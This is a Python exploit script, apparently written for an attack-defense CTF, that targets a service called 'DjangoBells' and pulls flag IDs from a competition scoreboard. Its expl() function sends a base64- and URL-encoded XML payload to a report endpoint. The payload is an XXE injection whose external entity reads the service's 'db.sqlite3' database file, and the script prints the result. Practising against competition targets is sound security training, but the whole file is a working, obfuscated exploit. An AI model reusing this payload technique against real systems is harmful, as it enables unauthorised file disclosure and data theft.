#!/usr/bin/env python3

import json
import random
import requests
import string
import sys

# CHANGE THESE
service_name = 'DjangoBells'
service_port = 8000

# UTILITY FUNCTIONS
randstr = lambda N: ''.join(random.choices(string.ascii_uppercase + string.digits, k=N))
randmail = lambda: f"{randstr(8)}@{randstr(8)}.com"

ip = sys.argv[1]
url = f'http://{ip}:{service_port}'

def expl(flag_id=None):
    # Write your exploit here, and print stuff containing the flags
    # flush=True is MANDATORY
    print(requests.get(f"{url}/read/report/%3Freport=PCFET0NUWVBFIHJvb3QgWzwhRU5USVRZIGFtcCBTWVNURU0gImRiLnNxbGl0ZTMiPl0%25252BPGlkPiZhbXA7PC9pZD48cmVhc29uPmFzZDwvcmVhc29uPg%3D%3D%26").text)



def get_flag_ids():
    r = requests.get('https://scoreboard.ctf.saarland/attack.json')
    if r.status_code != 200:
        print(r.text)
        raise RuntimeError("Failed to fetch flag IDs")
    return json.loads(r.text)

expl()